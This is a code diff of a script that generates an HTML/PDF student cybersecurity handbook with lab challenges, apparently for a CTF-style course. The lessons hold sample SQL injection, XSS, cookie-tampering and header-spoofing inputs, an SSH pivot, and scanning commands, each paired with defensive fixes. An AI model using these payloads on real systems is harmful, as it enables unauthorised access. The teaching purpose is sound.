-    <div class="callout teacher-tip">
-      <strong>Anatomy of an HTTP Request:</strong><br>
-      An HTTP request is pure text containing three main elements:
-      <ol>
-        <li><strong>Request Line:</strong> The method and path (e.g., <code>GET /index.html HTTP/1.1</code>).</li>
-        <li><strong>Headers:</strong> Key-value metadata (e.g., <code>User-Agent: curl/7.88.1</code>, <code>X-Custom-Auth: secret</code>).</li>
-        <li><strong>Body:</strong> The payload (used in POST and PUT requests).</li>
-      </ol>
-    </div>
-    <p>Students use <code>curl -i -H "X-Warden-Token: secret" http://127.0.0.1:8080/api</code> to manually inject required authentication headers, experiencing firsthand how HTTP requests are structured.</p>
-  </div>
-
-  <!-- Challenge 7: network-protocol-id -->
-  <div class="challenge-block">
-    <div class="challenge-title">
-      <h3>Challenge 7: Speaking Alien Dialects (network-protocol-id)</h3>
-      <span class="challenge-tag">Protocol Triage &bull; Text vs. Binary</span>
-    </div>
-    <p><strong>The Concept:</strong> Not every protocol on a network is human-readable HTTP or SMTP. Many proprietary, industrial, or gaming protocols communicate in raw binary packets. When an unknown port opens, how do you identify what language it speaks?</p>
-    <p>Students connect to mystery endpoints and observe how they respond:</p>
-    <ul>
-      <li>Does it print ASCII text? (e.g., <code>220 Service Ready</code> &rarr; SMTP/FTP).</li>
-      <li>Does it emit binary bytes? (e.g., <code>\x89PNG</code> or <code>\x1f\x8b</code> &rarr; Gzip/Zlib).</li>
-      <li>Does it echo back input or expect an immediate binary handshake?</li>
-    </ul>
-    <p>This develops intuitive diagnostic triage skills required during real-world penetration tests.</p>
-  </div>
-
-  <!-- Challenge 8: network-firewall -->
-  <div class="challenge-block">
-    <div class="challenge-title">
-      <h3>Challenge 8: The Bouncer at the Gate (network-firewall)</h3>
-      <span class="challenge-tag">Defensive Rules &bull; iptables &amp; Ingress Filtering</span>
-    </div>
-    <p><strong>The Concept:</strong> A firewall is a network traffic filter. The Linux kernel includes a built-in packet filtering framework called <code>netfilter</code>, managed via <code>iptables</code> or <code>nftables</code>.</p>
-    <div class="callout defense-rule">
-      <strong>The Default-Deny Golden Rule:</strong><br>
-      A properly configured firewall should follow <strong>Default Deny</strong>:
-      <em>"Block all incoming traffic by default, and explicitly allow only the specific ports and IP addresses that are strictly necessary."</em>
-    </div>
-    <p>Students inspect firewall tables using <code>iptables -L -n -v</code>, identifying misconfigured rules where specific ports or subnets were inadvertently left open to unauthorized networks.</p>
-  </div>
-
-  <!-- Challenge 9: network-pcap-forensics -->
-  <div class="challenge-block">
-    <div class="challenge-title">
-      <h3>Challenge 9: Digital Archaeology (network-pcap-forensics)</h3>
-      <span class="challenge-tag">Forensics &bull; Stream Reassembly</span>
-    </div>
-    <p><strong>The Concept:</strong> Large files (like images, archives, or executable binaries) cannot fit in a single 1500-byte network packet. TCP breaks files into dozens or thousands of segments, transmits them out of order, and reassembles them at the receiver.</p>
-    <p>Students learn how network forensic analysts extract transmitted files from recorded PCAP streams:</p>
-    <pre><code>tshark -r stream.pcap --export-objects "http,./extracted_files"</code></pre>
-    <p>Carving files out of packet streams demonstrates how evidence is recovered during incident response investigations.</p>
-  </div>
-
-  <!-- Challenge 10: network-pivot -->
-  <div class="challenge-block">
-    <div class="challenge-title">
-      <h3>Challenge 10: Stepping Across Islands (network-pivot)</h3>
-      <span class="challenge-tag">Advanced &bull; Multi-Hop Network Pivoting</span>
-    </div>
-    <p><strong>The Concept:</strong> In enterprise security, sensitive internal databases are never connected directly to the public internet. They sit in deep internal network segments. When an attacker compromises an external-facing server (a jump host or bastion), they use that host as a bridge to reach internal networks. This technique is known as <strong>network pivoting</strong>.</p>
-    
-    <div class="callout analogy">
-      <strong>The Island Bridge Analogy:</strong><br>
-      Imagine you stand on Island A. Island C is miles away across deep water, and you cannot jump to it. But Island B sits in the middle with a bridge connecting to Island A, and another bridge connecting to Island C. If you walk across the bridge to Island B, you can now reach Island C!
-    </div>
-    <p>Students configure multi-hop SSH tunnels (<code>ssh -D 1080</code>) or proxy chains to route traffic through compromised intermediate hosts, unlocking deeply protected internal nodes.</p>
-  </div>
+  // Render chapters and challenges
+  for (const ch of chapters) {
+    html += `
+<div class="chapter-header">
+  <div class="chapter-tag">Dungeon 0${ch.number} • Conceptual Foundations</div>
+  <h1>${ch.title}</h1>
 </div>
 
-<!-- PART II: WEB DUNGEON -->
-<div class="page-break">
-  <div class="chapter-header">
-    <div class="chapter-tag">Part II &bull; Dungeon 4</div>
-    <h1>The Web Dungeon: Breaking the Browser's Trust</h1>
+<p><em>${ch.subtitle}</em></p>
+${ch.introduction}
+`
+
+    for (const challenge of ch.challenges) {
+      html += `
+<div class="challenge-block">
+  <div class="challenge-title">
+    <h3>${challenge.title}</h3>
+    <span class="challenge-tag">${challenge.slug}</span>
   </div>
 
-  <h2>Chapter 2: The Modern Web &amp; The Illusion of Client Trust</h2>
-  <p>The web is built on a fundamental division of labor: the <strong>Client</strong> (the student's web browser) and the <strong>Server</strong> (the backend computer hosting databases and business logic). The browser renders HTML, applies CSS styling, and executes JavaScript to create snappy user interfaces.</p>
-  
-  <p>However, this division creates the single most common vulnerability category in all of computer science: <strong>The Fallacy of Client Trust</strong>.</p>
+  <p><strong>Fundamental Concept:</strong> <code>${challenge.concept}</code></p>
+
+  <div class="callout incident-box">
+    <strong>Historical Real-World Incident:</strong><br>
+    ${challenge.incident}
+  </div>
+
+  <h4>The Teacher's Lecture & Mental Model</h4>
+  <p>${challenge.lecture}</p>
+
+  <h4>Under the Hood: Technical Architecture</h4>
+  <div>${challenge.underTheHood}</div>
+
+  <h4>The Investigator's Playbook: How to Explore & Verify</h4>
+  <div>${challenge.playbook}</div>
 
   <div class="callout defense-rule">
-    <strong>The First Law of Web Security:</strong><br>
-    <strong>Never trust the client.</strong> The client machine is owned and operated by the user. An attacker has full control over their browser, can inspect every line of front-end JavaScript, can modify every HTTP request, and can tamper with every cookie, parameter, and header before sending it to the server.
+    <strong>Defensive Engineering & Root-Cause Remediation:</strong><br>
+    ${challenge.defense}
   </div>
 
-  <!-- Challenge 1: web-recon -->
-  <div class="challenge-block">
-    <div class="challenge-title">
-      <h3>Challenge 1: Read the Map (web-recon)</h3>
-      <span class="challenge-tag">Mandatory &bull; Information Disclosure</span>
-    </div>
-    <p><strong>The Concept:</strong> Search engines like Google crawl the web by following links. Webmasters use a text file at the root of their website called <code>/robots.txt</code> to tell automated crawlers: <em>"Please do not index these private folders."</em></p>
-    <div class="callout why-it-happens">
-      <strong>The Irony of robots.txt:</strong><br>
-      To tell a polite crawler what not to look at, the administrator must list all the secret paths in plain text! An attacker looks at <code>/robots.txt</code> first, treating it as an official treasure map of hidden endpoints.
-    </div>
-    <pre><code>User-agent: *
-Disallow: /keep-backup/
-Disallow: /admin-console/</code></pre>
-    <p>Visiting <code>/keep-backup</code> immediately reveals exposed development notes and backup indices that were never meant for public eyes.</p>
-  </div>
-
-  <!-- Challenge 2: web-devtools -->
-  <div class="challenge-block">
-    <div class="challenge-title">
-      <h3>Challenge 2: Under the Hood of Your Browser (web-devtools)</h3>
-      <span class="challenge-tag">Browser Inspection &bull; Custom HTTP Headers</span>
-    </div>
-    <p><strong>The Concept:</strong> Most users only look at the graphical elements rendered on their screen. But web pages communicate dozens of metadata fields in the background via <strong>HTTP Response Headers</strong>.</p>
-    <p>Students open their browser Developer Tools (F12) &rarr; <strong>Network Tab</strong>, refresh the page, and inspect the raw response headers for <code>/account</code>. There, hiding in plain sight, sits a header like:</p>
-    <pre><code>HTTP/1.1 200 OK
-Content-Type: text/plain
-X-Keep-Token: S0VZX34wcnRfc2Nhbm5lcl9ubzBi...</code></pre>
-    <p>Decoding the Base64 token reveals the flag, teaching students that web security extends far beyond what is visible on the rendered page.</p>
-  </div>
-
-  <!-- Challenge 3: web-cookie-trust -->
-  <div class="challenge-block">
-    <div class="challenge-title">
-      <h3>Challenge 3: The VIP Wristband Problem (web-cookie-trust)</h3>
-      <span class="challenge-tag">Session Tampering &bull; Insecure Cookies</span>
-    </div>
-    <p><strong>The Concept:</strong> HTTP is <strong>stateless</strong>. When you click from page A to page B, the server forgets who you are unless you provide a token proving your identity. The most common mechanism for this is a <strong>cookie</strong>.</p>
-    <div class="callout analogy">
-      <strong>The Waterpark Wristband Analogy:</strong><br>
-      Imagine a waterpark hands you a paper wristband that says <code>role=guest</code> written in blue ballpoint pen. If the lifeguard at the VIP slide simply glances at the wristband and lets anyone through who has <code>role=admin</code> written on it, what stops a guest from crossing out "guest" with a marker and writing "admin"?
-    </div>
-    <p>In this challenge, the application checks:</p>
-    <pre><code>if (req.cookies.role === 'admin') {
-  return res.send("Welcome Warden: " + flag);
-}</code></pre>
-    <p>By opening DevTools &rarr; Application &rarr; Cookies and editing their cookie from <code>role=user</code> to <code>role=admin</code>, students walk right past the gate, illustrating why authorization must be cryptographically signed (like HMAC-signed JWTs or secure session stores).</p>
-  </div>
-
-  <!-- Challenge 4: web-client-trust -->
-  <div class="challenge-block">
-    <div class="challenge-title">
-      <h3>Challenge 4: The Honor System at Checkout (web-client-trust)</h3>
-      <span class="challenge-tag">Parameter Tampering &bull; Business Logic Bypass</span>
-    </div>
-    <p><strong>The Concept:</strong> An online store displays an item with a price of $50. The HTML form includes an input field: <code>&lt;input type="hidden" name="price" value="50"&gt;</code>.</p>
-    <div class="callout why-it-happens">
-      <strong>Why Do Developers Do This?</strong><br>
-      Front-end developers often think: <em>"The user cannot change this because it's a hidden field or disabled input."</em> But the user is sending the HTTP POST request! An attacker can open <code>curl</code> or Burp Suite and change the request body to <code>price=0</code> or <code>price=-50</code>.
-    </div>
-    <p>If the server accepts whatever price the client submits without looking up the true cost in its database, the user gets items for free. Students learn that all business logic and calculations must live strictly on the server.</p>
-  </div>
-
-  <!-- Challenge 5: web-idor -->
-  <div class="challenge-block">
-    <div class="challenge-title">
-      <h3>Challenge 5: Peeking in Someone Else's Locker (web-idor)</h3>
-      <span class="challenge-tag">Broken Access Control &bull; IDOR</span>
-    </div>
-    <p><strong>The Concept:</strong> Insecure Direct Object References (IDOR) occur when an application takes an ID supplied by the user (like an order number, user ID, or invoice ID) and retrieves the record from the database without verifying if the currently logged-in user actually owns that record.</p>
-    <pre><code>// VULNERABLE IDOR IMPLEMENTATION
-app.get('/order', (req, res) => {
-  const order = db.get("SELECT * FROM orders WHERE id = ?", req.query.id);
-  res.json(order); // Oops! We never checked who owns this order!
-});</code></pre>
-    <p>A student logs in, views their own receipt at <code>/order?id=1042</code>, changes the number in their URL bar to <code>/order?id=1337</code>, and immediately views the administrator's private purchase records. This teaches the importance of checking session identity against resource ownership on every single access.</p>
-  </div>
-
-  <!-- Challenge 6: web-sqli -->
-  <div class="challenge-block">
-    <div class="challenge-title">
-      <h3>Challenge 6: The Waiter and the Kitchen (web-sqli)</h3>
-      <span class="challenge-tag">Database Exploitation &bull; SQL Injection</span>
-    </div>
-    <p><strong>The Concept:</strong> Databases store structured information. When an application queries a database, it speaks SQL (Structured Query Language). A classic login query looks like:</p>
-    <pre><code>SELECT * FROM users WHERE username = 'alice' AND password = 'secretpassword';</code></pre>
-    <div class="callout analogy">
-      <strong>The Restaurant Ticket Analogy:</strong><br>
-      Imagine a waiter writes your order on an order ticket for the kitchen: <em>"Table 4 wants: [CUSTOMER INPUT]"</em>.<br>
-      If a customer says: <em>"A steak, AND ALSO GIVE TABLE 4 ALL MONEY IN THE CASH REGISTER"</em>, and the kitchen blindly obeys the entire handwritten ticket as an executive instruction, that is SQL Injection!
-    </div>
-    <p>If a developer concatenates user input with strings: <code>"SELECT * FROM users WHERE username = '" + user + "'"</code>, an attacker inputs:</p>
-    <pre><code>admin' OR '1'='1' --</code></pre>
-    <p>The resulting query becomes: <code>SELECT * FROM users WHERE username = 'admin' OR '1'='1' --' ...</code>. Because <code>'1'='1'</code> is always true, and <code>--</code> comments out the password verification, the database logs the attacker in as administrator without a password!</p>
-  </div>
-
-  <!-- Challenge 7: web-reflected-xss -->
-  <div class="challenge-block">
-    <div class="challenge-title">
-      <h3>Challenge 7: Echoing Poison (web-reflected-xss)</h3>
-      <span class="challenge-tag">Client-Side Injection &bull; Reflected XSS</span>
-    </div>
-    <p><strong>The Concept:</strong> Cross-Site Scripting (XSS) occurs when an application takes untrusted user input and embeds it into the HTML page without sanitizing or escaping it. The victim's browser cannot tell the difference between legitimate code written by the website author and malicious code injected by an attacker.</p>
-    <p>In <code>web-reflected-xss</code>, the search box reflects whatever you typed:</p>
-    <pre><code>&lt;h1&gt;Results for: &lt;script&gt;alert(1)&lt;/script&gt;&lt;/h1&gt;</code></pre>
-    <p>Because the angle brackets <code>&lt; &gt;</code> are rendered directly into the HTML document object model (DOM), the browser executes the script inside the user's active session, allowing an attacker to steal session cookies or perform unauthorized actions.</p>
-  </div>
-
-  <!-- Challenge 8: web-headers -->
-  <div class="challenge-block">
-    <div class="challenge-title">
-      <h3>Challenge 8: The Return Address Lie (web-headers)</h3>
-      <span class="challenge-tag">Access Control Bypass &bull; Header Forgery</span>
-    </div>
-    <p><strong>The Concept:</strong> Some developers try to restrict administrative portals by checking the <code>X-Forwarded-For</code> or <code>Referer</code> headers, assuming requests claiming to come from <code>127.0.0.1</code> must be internal and trustworthy.</p>
-    <p>Students learn that <strong>HTTP request headers are completely controlled by the client</strong>. By supplying <code>curl -H "X-Forwarded-For: 127.0.0.1"</code> or custom origin headers, students demonstrate why security boundaries must never rely on unverified client-asserted metadata.</p>
-  </div>
-
-  <!-- Challenge 9: web-stored-xss -->
-  <div class="challenge-block">
-    <div class="challenge-title">
-      <h3>Challenge 9: A Time Bomb on the Bulletin Board (web-stored-xss)</h3>
-      <span class="challenge-tag">Persistent Injection &bull; Stored XSS</span>
-    </div>
-    <p><strong>The Concept:</strong> Reflected XSS requires tricking a victim into clicking a crafted link. <strong>Stored XSS</strong> is much more dangerous: the malicious script is submitted to a persistent storage location (like a guestbook, forum post, or profile bio).</p>
-    <p>When any other user (including the platform administrator) visits the guestbook, the server pulls the malicious comment out of the database and delivers it to their browser, executing silently inside their session without any link clicking required.</p>
-  </div>
-
-  <!-- Challenge 10: web-chain -->
-  <div class="challenge-block">
-    <div class="challenge-title">
-      <h3>Challenge 10: The Domino Effect (web-chain)</h3>
-      <span class="challenge-tag">Advanced &bull; Multi-Stage Exploit Chaining</span>
-    </div>
-    <p><strong>The Concept:</strong> In real-world security assessments, a single small vulnerability rarely brings down an entire fortress. Attackers achieve critical compromises by <strong>chaining</strong> multiple low-severity findings together.</p>
-    <div class="callout teacher-tip">
-      <strong>The 3-Step Exploit Chain:</strong>
-      <ol>
-        <li><strong>Step 1 (Reconnaissance):</strong> Inspect <code>/robots.txt</code> to discover the hidden administrative endpoint: <code>/keep-admin</code>.</li>
-        <li><strong>Step 2 (Access Control Violation):</strong> Visit <code>/keep-admin/vault</code> and receive a 403 Forbidden error stating "admin role required".</li>
-        <li><strong>Step 3 (Session Tampering):</strong> Set your browser cookie to <code>role=admin</code> and refresh, unlocking the inner vault!</li>
-      </ol>
-    </div>
-    <p>This challenge brings together all lessons learned in the Web Dungeon, illustrating how small informational leaks pave the way for total administrative compromise.</p>
+  <div class="callout question-box">
+    <strong>Teacher's Review Question & Exercise:</strong><br>
+    ${challenge.question}
   </div>
 </div>
+`
+    }
+  }
 
-<!-- PART III: SECURE CODING DUNGEON -->
-<div class="page-break">
-  <div class="chapter-header">
-    <div class="chapter-tag">Part III &bull; Dungeon 5</div>
-    <h1>The Secure Coding Dungeon: The Art of Defensive Engineering</h1>
-  </div>
-
-  <h2>Chapter 3: The Defensive Engineer's Mindset</h2>
-  <p>Breaking a vulnerable application is fun, eye-opening, and thrilling. But anyone can knock down a wall with a sledgehammer; it takes true mastery, deep engineering discipline, and craft to design a wall that cannot be knocked down in the first place.</p>
-  
-  <p>In <strong>The Forge</strong>, students put on the hardhat of a software engineer. You are handed the actual source code of the vulnerable web application and given an automated test suite. Your mission is twofold:</p>
-  <ol>
-    <li><strong>Neutralize the exploit:</strong> Make sure malicious inputs and attacks fail completely.</li>
-    <li><strong>Keep the application working:</strong> Ensure that legitimate users can still log in, view their orders, and use the system without disruption.</li>
-  </ol>
-
-  <!-- Challenge 1: secure-sqli -->
-  <div class="challenge-block">
-    <div class="challenge-title">
-      <h3>Challenge 1: Separating Code from Data (secure-sqli)</h3>
-      <span class="challenge-tag">Defensive SQL &bull; Prepared Statements</span>
-    </div>
-    <p><strong>The Flawed Attempt (Blacklisting):</strong> Beginners often try to fix SQL injection by writing filter blacklists:</p>
-    <pre><code>// FLAWED FIX &mdash; DO NOT DO THIS!
-if (username.includes("'")) return res.status(401).send("No quotes allowed!");</code></pre>
-    <p>Why does this fail? First, an attacker can often bypass filters using alternative encodings. Second, what happens when a real user named <strong>O'Brien</strong> tries to log into your service? The blacklist breaks legitimate business functionality!</p>
-
-    <div class="callout defense-rule">
-      <strong>The Secure Solution &mdash; Parameterized Queries:</strong><br>
-      Instead of pasting strings together, use <strong>Prepared Statements</strong>. A prepared statement pre-compiles the SQL query structure in the database engine first. The user input is then sent separately as pure data parameters. Even if the user enters <code>' OR 1=1 --</code>, the database treats it as a literal string value for a username, never as executable SQL logic!
-    </div>
-
-    <pre><code>// SECURE IMPLEMENTATION
-const stmt = db.prepare('SELECT * FROM users WHERE username = ? AND password = ?');
-const row = stmt.get(username, password);</code></pre>
-  </div>
-
-  <!-- Challenge 2: secure-xss -->
-  <div class="challenge-block">
-    <div class="challenge-title">
-      <h3>Challenge 2: Teaching the Browser What is Safe (secure-xss)</h3>
-      <span class="challenge-tag">Output Encoding &bull; HTML Entity Escaping</span>
-    </div>
-    <p><strong>The Flawed Attempt (Tag Stripping):</strong></p>
-    <pre><code>// FLAWED FIX
-const sanitized = input.replace(/&lt;script&gt;/gi, "");</code></pre>
-    <p>Stripping <code>&lt;script&gt;</code> tags fails immediately because modern HTML supports dozens of ways to execute JavaScript without script tags: <code>&lt;img src="x" onerror="alert(1)"&gt;</code>, <code>&lt;svg onload="alert(1)"&gt;</code>, or <code>&lt;body onload="..."&gt;</code>.</p>
-
-    <div class="callout defense-rule">
-      <strong>The Secure Solution &mdash; Context-Aware HTML Encoding:</strong><br>
-      Whenever user data is rendered into an HTML document, convert special characters into their safe HTML entity equivalents:
-      <ul>
-        <li><code>&amp;</code> &rarr; <code>&amp;amp;</code></li>
-        <li><code>&lt;</code> &rarr; <code>&amp;lt;</code></li>
-        <li><code>&gt;</code> &rarr; <code>&amp;gt;</code></li>
-        <li><code>"</code> &rarr; <code>&amp;quot;</code></li>
-        <li><code>'</code> &rarr; <code>&amp;#39;</code></li>
-      </ul>
-      When the browser sees <code>&amp;lt;script&amp;gt;</code>, it renders the characters as harmless readable text on screen without ever executing them as code.
-    </div>
-  </div>
-
-  <!-- Challenge 3: secure-idor -->
-  <div class="challenge-block">
-    <div class="challenge-title">
-      <h3>Challenge 3: Checking the ID at the Counter (secure-idor)</h3>
-      <span class="challenge-tag">Authorization &bull; Session Ownership Binding</span>
-    </div>
-    <p><strong>The Flawed Fix:</strong> Hardcoding checks for specific IDs (e.g., <code>if (id === 1337) return 403</code>) fails as soon as a new record is inserted.</p>
-    <div class="callout defense-rule">
-      <strong>The Secure Solution &mdash; Scope Queries to Session Identity:</strong><br>
-      Never query the database solely by the client's requested ID. Always bind the query to the authenticated user stored in the session cookie:
-    </div>
-    <pre><code>// SECURE IMPLEMENTATION
-const currentUser = req.session.user; // Authenticated server-side identity
-const order = db.prepare('SELECT * FROM orders WHERE id = ? AND owner = ?')
-                .get(req.query.id, currentUser);
-if (!order) return res.status(404).send("Order not found or unauthorized");</code></pre>
-  </div>
-
-  <!-- Challenge 4: secure-client -->
-  <div class="challenge-block">
-    <div class="challenge-title">
-      <h3>Challenge 4: Trust, But Verify on the Server (secure-client)</h3>
-      <span class="challenge-tag">Input Validation &bull; Server-Side Enforcement</span>
-    </div>
-    <p><strong>The Concept:</strong> To fix client-side price tampering, the server must validate all incoming data against strict business rules:</p>
-    <ul>
-      <li>Is the value a valid finite number?</li>
-      <li>Is the value strictly greater than zero?</li>
-      <li>Better yet: Look up the authentic price in the product catalog database using a product ID rather than trusting a client-supplied price tag!</li>
-    </ul>
-    <pre><code>// SECURE IMPLEMENTATION
-const price = Number(req.body.price);
-if (isNaN(price) || price &lt;= 0) {
-  return res.status(400).send("Invalid order amount");
-}</code></pre>
-  </div>
-
-  <!-- Challenge 5: secure-headers -->
-  <div class="challenge-block">
-    <div class="challenge-title">
-      <h3>Challenge 5: Armoring the Browser (secure-headers)</h3>
-      <span class="challenge-tag">Defense-in-Depth &bull; Security Headers &amp; CSP</span>
-    </div>
-    <p><strong>The Concept:</strong> Security headers instruct the user's browser to activate its built-in security defenses.</p>
-    <table>
-      <thead>
-        <tr>
-          <th>Header</th>
-          <th>What It Does</th>
-        </tr>
-      </thead>
-      <tbody>
-        <tr>
-          <td><code>Content-Security-Policy (CSP)</code></td>
-          <td>Restricts where scripts, styles, and images can be loaded from. Prevents unauthorized inline script execution.</td>
-        </tr>
-        <tr>
-          <td><code>X-Frame-Options: DENY</code></td>
-          <td>Stops clickjacking by preventing other sites from embedding your page in an iframe.</td>
-        </tr>
-        <tr>
-          <td><code>X-Content-Type-Options: nosniff</code></td>
-          <td>Prevents the browser from misinterpreting a text or image file as an executable script.</td>
-        </tr>
-      </tbody>
-    </table>
-    <p>Students implement standard headers using modern middleware like <code>helmet</code>.</p>
-  </div>
-
-  <!-- Challenge 6: secure-rate-limit -->
-  <div class="challenge-block">
-    <div class="challenge-title">
-      <h3>Challenge 6: Calming the Storm (secure-rate-limit)</h3>
-      <span class="challenge-tag">Anti-Abuse &bull; Token Buckets &amp; 429 Limiting</span>
-    </div>
-    <p><strong>The Concept:</strong> Computers can submit thousands of passwords or requests per second. To protect servers from denial-of-service and brute-force attacks, we implement <strong>Rate Limiting</strong>.</p>
-    <div class="callout analogy">
-      <strong>The Bouncer's Clicker:</strong><br>
-      A rate limiter tracks requests per IP address or account over a sliding time window (e.g., maximum 5 attempts per 60 seconds). Once the limit is reached, the server responds with <strong>HTTP 429 Too Many Requests</strong> and a <code>Retry-After</code> header, resetting only after the window expires.
-    </div>
-  </div>
-
-  <!-- Challenge 7: secure-hide-secret -->
-  <div class="challenge-block">
-    <div class="challenge-title">
-      <h3>Challenge 7: Keeping the Keys in the Safe (secure-hide-secret)</h3>
-      <span class="challenge-tag">Secrets Management &bull; Environment Decoupling</span>
-    </div>
-    <p><strong>The Mistake:</strong> Storing API keys, database passwords, or cryptographic secrets directly in source code files.</p>
-    <div class="callout why-it-happens">
-      <strong>Why Hardcoding Keys Is Fatal:</strong><br>
-      Code gets committed to Git repositories, pushed to GitHub, shared with teammates, and included in backups. Once an API key is committed to source control, it is practically public knowledge.
-    </div>
-    <p><strong>The Secure Pattern:</strong> Store all credentials in external environment variables (accessed via <code>process.env.API_KEY</code>) that are injected into the container at runtime and excluded from source repositories and public configuration endpoints.</p>
-  </div>
-
-  <!-- Challenge 8: secure-full-review -->
-  <div class="challenge-block">
-    <div class="challenge-title">
-      <h3>Challenge 8: The Master Builder's Final Inspection (secure-full-review)</h3>
-      <span class="challenge-tag">Full-Stack Hardening &bull; Comprehensive Audit</span>
-    </div>
-    <p><strong>The Capstone Challenge of Defensive Engineering:</strong> In this final test, students review an entire production codebase exhibiting multiple interacting vulnerabilities.</p>
-    <p>Students must apply everything they have learned:</p>
-    <ul>
-      <li>Replace string-concatenated SQL queries with prepared statements.</li>
-      <li>Escape all reflected and stored output strings.</li>
-      <li>Enforce strict session-bound IDOR authorization matrices.</li>
-      <li>Strip sensitive credentials from debug endpoints.</li>
-      <li>Configure defensive HTTP headers and rate limiters.</li>
-    </ul>
-    <p>When the automated test harness runs all attack vectors simultaneously and confirms that every exploit is blocked while the application still functions seamlessly, the student has earned the title of <strong>Warden of the Keep</strong>.</p>
-  </div>
-</div>
-
-<!-- Epilogue & Quick Reference -->
-<div class="page-break">
-  <h1>Epilogue: The Path Forward as an Ethical Guardian</h1>
-  <p>Congratulations on completing your study of the Signals, Trading Post, and Forge dungeons!</p>
-  <p>The technical skills you have explored—socket binding, packet analysis, HTTP protocol mechanics, database injection, client-side script execution, and defensive engineering—are powerful tools. With that power comes a profound ethical responsibility.</p>
-  
-  <div class="callout analogy">
-    <strong>The Ethics of the Craft:</strong><br>
-    The knowledge of how to pick a lock can be used by a burglar to rob a house in the night, or by a locksmith to rescue a child trapped in a room. The physical tools are identical; the intent and moral compass of the practitioner make all the difference.
-  </div>
-
-  <p>Always practice your skills exclusively on systems you own or have explicit, documented, written permission to test (such as BreachKeep, approved CTFs, and educational labs). Channel your curiosity into building software that protects human privacy, defends vital infrastructure, and makes the digital world a safer place for everyone.</p>
-
-  <h2>Quick Reference Toolkit</h2>
-  <table>
-    <thead>
-      <tr>
-        <th>Tool / Command</th>
-        <th>Primary Use Case</th>
-      </tr>
-    </thead>
-    <tbody>
-      <tr>
-        <td><code>ss -ltn</code></td>
-        <td>List local listening TCP sockets and ports without resolving names.</td>
-      </tr>
-      <tr>
-        <td><code>nc -nv &lt;ip&gt; &lt;port&gt;</code></td>
-        <td>Connect to a raw TCP socket to grab banners or test communications.</td>
-      </tr>
-      <tr>
-        <td><code>nmap -sT -p &lt;ports&gt; &lt;ip&gt;</code></td>
-        <td>Perform a TCP connect port scan across remote targets.</td>
-      </tr>
-      <tr>
-        <td><code>tshark -r &lt;file.pcap&gt;</code></td>
-        <td>Analyze recorded packet capture streams from the command line.</td>
-      </tr>
-      <tr>
-        <td><code>curl -i -H "..." &lt;url&gt;</code></td>
-        <td>Craft custom HTTP requests with injected headers and view response metadata.</td>
-      </tr>
-      <tr>
-        <td><code>dig @&lt;server&gt; &lt;domain&gt; TXT</code></td>
-        <td>Query DNS servers for specific record types and hidden text annotations.</td>
-      </tr>
-    </tbody>
-  </table>
-
-  <p style="text-align: center; margin-top: 3rem; color: #64748b; font-size: 10pt;">
-    &mdash; <em>BreachKeep Faculty Curriculum &bull; Designed for Curious Minds &bull; Keep Moving Forward</em> &mdash;
-  </p>
+  html += `
+<div class="page-break" style="margin-top: 3rem; text-align: center; color: #64748b; font-size: 10pt;">
+  <hr style="border: none; border-top: 1px solid #cbd5e1; margin-bottom: 2rem;">
+  <p><strong>BreachKeep Student Cybersecurity Teaching Handbook</strong></p>
+  <p>Authored for aspiring defenders, software engineers, and cybersecurity leaders.</p>
+  <p><em>"Defend the wire. Master the protocol. Secure the future."</em></p>
 </div>
 
 </body>
 </html>
 `
+  return html
+}
 
-fs.writeFileSync(htmlPath, htmlContent)
-console.log('HTML written to:', htmlPath)
+const finalHtml = buildHtml()
+fs.writeFileSync(htmlPath, finalHtml, 'utf8')
+console.log('Comprehensive HTML handbook generated at:', htmlPath)
 
-console.log('Rendering HTML to PDF via Microsoft Edge headless...')
+console.log('Rendering high-resolution PDF via Microsoft Edge headless...')
 const edgePath = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"
 
 try {
   execSync(`"${edgePath}" --headless --disable-gpu --run-all-compositor-stages-before-draw --print-to-pdf="${pdfPath}" "${htmlPath}"`)
   if (fs.existsSync(pdfPath)) {
     const stats = fs.statSync(pdfPath)
-    console.log(`SUCCESS! PDF created at ${pdfPath} (${stats.size} bytes)`)
+    console.log(`SUCCESS! High-resolution PDF compiled at ${pdfPath} (${stats.size} bytes)`)
   } else {
     console.error('PDF file was not created.')
   }
 } catch (e) {
-  console.error('Error rendering PDF:', e)
+  console.error('Error rendering PDF with Edge:', e)
+}
+
+// Update the ZIP archive bundle automatically
+console.log('Updating BreachKeep_Student_Handbook.zip package...')
+const zipPath = path.join(rootDir, 'BreachKeep_Student_Handbook.zip')
+const stagingDir = path.join(outDir, 'bundle_staging')
+fs.mkdirSync(stagingDir, { recursive: true })
+fs.copyFileSync(pdfPath, path.join(stagingDir, 'BreachKeep_Student_Handbook.pdf'))
+fs.copyFileSync(htmlPath, path.join(stagingDir, 'BreachKeep_Student_Handbook.html'))
+
+const scriptsStaging = path.join(stagingDir, 'scripts')
+fs.mkdirSync(scriptsStaging, { recursive: true })
+fs.copyFileSync(path.join(rootDir, 'scripts', 'generate-handbook-pdf.mjs'), path.join(scriptsStaging, 'generate-handbook-pdf.mjs'))
+
+const readmeContent = `# The Defender's Compass: BreachKeep Student Cybersecurity Teaching Handbook
+
+Welcome to the **BreachKeep Student Cybersecurity Teaching Handbook**!
+
+This package contains everything you need to read, view, or regenerate the comprehensive student cybersecurity guide covering **Networking (Signals)**, **Web Application Security (The Trading Post)**, and **Defensive Engineering (The Forge)**.
+
+---
+
+## 📖 How to View the Handbook
+
+### 1. Print / Offline PDF Edition (Recommended)
+- Open **\`BreachKeep_Student_Handbook.pdf\`** in any standard PDF reader (Adobe Acrobat, Preview, Chrome, Edge, Firefox).
+- Formatted with dedicated chapter breaks, real-world breach case studies, callout boxes, and syntax-highlighted code.
+
+### 2. Interactive Web / HTML Edition
+- Double-click or open **\`BreachKeep_Student_Handbook.html\`** in any web browser.
+- Responsive, self-contained (zero external network dependencies required), with native styling for desktop and mobile reading.
+
+---
+
+## 🛠️ How to Recompile / Edit the Handbook
+
+If you make modifications to the text, styling, or challenge lessons:
+1. Ensure Node.js (v18+) is installed.
+2. Run:
+   \`\`\`bash
+   node scripts/generate-handbook-pdf.mjs
+   \`\`\`
+   *(Note: Automatic PDF rendering uses Microsoft Edge or Chromium in headless mode).*
+
+---
+
+## 📚 What's Inside
+
+- **The Teacher's Welcome & Mental Model**: Foundations of cybersecurity ethics and systems thinking.
+- **Chapter 1: Signals (Networking)**: 10 rooms covering Ports, Nmap scanning, Banner Grabbing, Wireshark packet capture, DNS, HTTP, Protocol Identification, Firewalls, PCAP forensics, and Pivoting.
